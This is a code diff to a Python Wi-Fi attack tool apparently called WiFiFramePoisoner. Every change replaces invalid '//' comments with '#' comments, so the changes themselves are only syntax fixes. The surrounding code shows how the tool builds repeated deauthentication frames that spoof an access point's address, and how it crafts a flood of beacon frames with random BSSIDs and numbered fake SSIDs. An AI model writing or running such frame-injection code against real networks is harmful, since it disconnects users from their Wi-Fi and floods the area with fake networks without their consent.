@@ -107,9 +107,9 @@ class WiFiFramePoisoner:
         frame += struct.pack("<H", 0x0000)  # Duration
         frame += target_mac  # Destination
         frame += ap_mac      # Source (spoofed AP)
-        frame += ap_mac      // BSSID
+        frame += ap_mac      # BSSID
         frame += struct.pack("<H", 0x0000)  # Sequence Control
-        frame += struct.pack("<H", reason)  // Reason code
+        frame += struct.pack("<H", reason)  # Reason code
 
         return frame * count
 
@@ -138,20 +138,20 @@ class WiFiFramePoisoner:
         for i in range(count):
             bssid = os.urandom(6)
             bssid = bytes([bssid[0] | 0x02, bssid[1], bssid[2],
-                           bssid[3], bssid[4], bssid[5]])  // Set locally administered bit
+                           bssid[3], bssid[4], bssid[5]])  # Set locally administered bit
 
             frame = b""
             frame += struct.pack("<H", 0x0080)  # Beacon
-            frame += struct.pack("<H", 0x0000)  // Duration
+            frame += struct.pack("<H", 0x0000)  # Duration
             frame += b"\xFF\xFF\xFF\xFF\xFF\xFF"  # Broadcast
             frame += bssid
-            frame += bssid  // BSSID
-            frame += struct.pack("<H", 0x0000)  // Seq
+            frame += bssid  # BSSID
+            frame += struct.pack("<H", 0x0000)  # Seq
 
             # Beacon body
-            frame += struct.pack("<Q", 0)      // Timestamp
-            frame += struct.pack("<H", 100)    // Beacon Interval
-            frame += struct.pack("<H", 0x0431) // Capability
+            frame += struct.pack("<Q", 0)      # Timestamp
+            frame += struct.pack("<H", 100)    # Beacon Interval
+            frame += struct.pack("<H", 0x0431) # Capability
 
             # SSID IE
             ssid_bytes = f"{ssid}-{i}".encode()
@@ -188,7 +188,7 @@ class WiFiFramePoisoner:
         frame += bytes([0x01, 0x08, 0x82, 0x84, 0x8B, 0x96,
                        0x0C, 0x12, 0x18, 0x24])
         frame += bytes([0x03, 0x01, channel])
-        frame += bytes([0x30, 0x02, 0x00, 0x00])  // WPA2 open
+        frame += bytes([0x30, 0x02, 0x00, 0x00])  # WPA2 open
         return frame
 
 
